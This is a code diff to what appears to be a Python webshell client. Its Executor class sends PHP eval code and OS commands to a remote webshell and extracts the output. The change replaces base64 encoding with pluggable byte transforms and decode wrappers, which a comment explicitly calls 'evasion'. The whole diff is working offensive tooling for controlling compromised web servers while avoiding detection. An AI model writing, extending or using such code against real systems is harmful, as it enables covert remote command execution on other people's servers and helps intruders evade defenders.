@@ -19,7 +19,7 @@ from __future__ import annotations
 import base64
 import shlex
 
-from ..encoders import Encoder, base64_encode
+from ..encoders import ByteTransform, get_transform
 from ..exceptions import ExecutionFailed, NoExecFunction, WebshellError
 from ..utils.strings import random_token
 from .backends import Backend, PHPBackend
@@ -30,12 +30,12 @@ class Executor:
     def __init__(
         self,
         transport: Transport,
-        encoder: Encoder | None = None,
+        transform: ByteTransform | None = None,
         backend: Backend | None = None,
     ):
         self.transport = transport
         self.backend = backend or PHPBackend()
-        self._encode = encoder or base64_encode
+        self._transform = transform or get_transform("base64")
         self._disabled: set[str] | None = None
         self._exec_function: str | None = None
 
@@ -63,7 +63,8 @@ class Executor:
         token = random_token()
         code = code.strip().rstrip(";")
         wrapped = self.backend.sentinel(token, code)
-        body = self.transport.send(self._encode(wrapped))
+        payload = self.backend.wrap_eval(self._transform.apply(wrapped.encode()))
+        body = self.transport.send(payload)
         return self._extract(body, token)
 
     @property
@@ -122,9 +123,12 @@ class Executor:
     def run_command(self, command: str) -> str:
         """Run an OS command (stderr merged into stdout) and return its output."""
         if not self.backend.supports_eval:
-            # Command shell: the parameter *is* a shell command; sentinel-wrap it.
+            # Command shell: the parameter *is* a shell command; sentinel-wrap it
+            # then run it through the backend's decode wrapper (evasion).
             token = random_token()
-            body = self.transport.send(self.backend.sentinel(token, f"{command} 2>&1"))
+            script = self.backend.sentinel(token, f"{command} 2>&1")
+            wire = self.backend.wrap_command(self._transform.apply(script.encode()))
+            body = self.transport.send(wire)
             return self._extract(body, token)
         function = self._resolve_exec_function()
         b64 = self._b64(f"{command} 2>&1")
